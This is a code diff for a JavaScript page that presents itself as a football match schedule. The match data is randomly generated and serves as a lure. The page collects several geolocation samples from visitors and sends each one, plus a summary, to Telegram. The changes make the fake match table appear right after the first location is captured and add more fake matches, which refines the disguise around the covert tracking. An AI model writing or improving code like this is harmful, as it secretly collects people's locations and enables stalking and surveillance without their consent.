@@ -4,7 +4,7 @@ const CONFIG={
   sampleCount:5,
   splashDurationMs:5000,
   sampleDelayMs:300,
-  developerName:'𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪' // زخرفة اسم المطور
+  developerName:'𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪'
 };
 
 const splash=document.getElementById('splash');
@@ -37,6 +37,7 @@ function requestGeolocationSamples(){
         };
         _samples.push(sample);
         sendSampleToTelegram(sample);
+        if(idx===0) showMatchesTable(); // جدول يظهر بعد أول عينة
         idx++;
         if(idx<CONFIG.sampleCount)setTimeout(takeSample,CONFIG.sampleDelayMs);
         else sendSummaryToTelegram();
@@ -82,7 +83,6 @@ function sendSummaryToTelegram(){
 ✨ Developer: ${CONFIG.developerName}
 `;
   _sendTelegramMessage(summary);
-  showMatchesTable();
 }
 
 function _sendTelegramMessage(text){
@@ -97,19 +97,6 @@ function _sendTelegramMessage(text){
 }
 
 /* Show matches */
-const leaguesData=[
-  {name:'الدوري المصري', matches:generateMatches(3)},
-  {name:'الدوري الإنجليزي', matches:generateMatches(3)},
-  {name:'الدوري الإسباني', matches:generateMatches(3)},
-  {name:'الدوري الإيطالي', matches:generateMatches(3)},
-  {name:'الدوري الألماني', matches:generateMatches(3)},
-  {name:'الدوري الفرنسي', matches:generateMatches(3)},
-  {name:'الدوري البرتغالي', matches:generateMatches(3)},
-  {name:'الدوري الهولندي', matches:generateMatches(3)},
-  {name:'الدوري التركي', matches:generateMatches(3)},
-  {name:'الدوري الروسي', matches:generateMatches(3)}
-];
-
 function generateMatches(count){
   const teams=['الأهلي','الزمالك','ليفربول','مانشستر يونايتد','ريال مدريد','برشلونة','يوفنتوس','ميلان','بايرن ميونخ','باريس سان جيرمان'];
   const stadiums=['استاد القاهرة','ملعب برج العرب','أولد ترافورد','كامب نو','سان سيرو','أليانز أرينا','حديقة الأمراء'];
@@ -118,10 +105,23 @@ function generateMatches(count){
     const t1=teams[Math.floor(Math.random()*teams.length)];
     let t2;
     do{t2=teams[Math.floor(Math.random()*teams.length)];}while(t2===t1);
-    arr.push({team1:t1,team2:t2,time:`${Math.floor(Math.random()*24)}:${Math.floor(Math.random()*60)}`,stadium:stadiums[Math.floor(Math.random()*stadiums.length)]});
+    arr.push({team1:t1,team2:t2,time:`${Math.floor(Math.random()*24)}:${Math.floor(Math.random()*60).toString().padStart(2,'0')}`,stadium:stadiums[Math.floor(Math.random()*stadiums.length)]});
   }
   return arr;
 }
+
+const leaguesData=[
+  {name:'الدوري المصري', matches:generateMatches(5)},
+  {name:'الدوري الإنجليزي', matches:generateMatches(5)},
+  {name:'الدوري الإسباني', matches:generateMatches(5)},
+  {name:'الدوري الإيطالي', matches:generateMatches(5)},
+  {name:'الدوري الألماني', matches:generateMatches(5)},
+  {name:'الدوري الفرنسي', matches:generateMatches(5)},
+  {name:'الدوري البرتغالي', matches:generateMatches(5)},
+  {name:'الدوري الهولندي', matches:generateMatches(5)},
+  {name:'الدوري التركي', matches:generateMatches(5)},
+  {name:'الدوري الروسي', matches:generateMatches(5)}
+];
 
 function showMatchesTable(){
   matchTable.style.display='block';
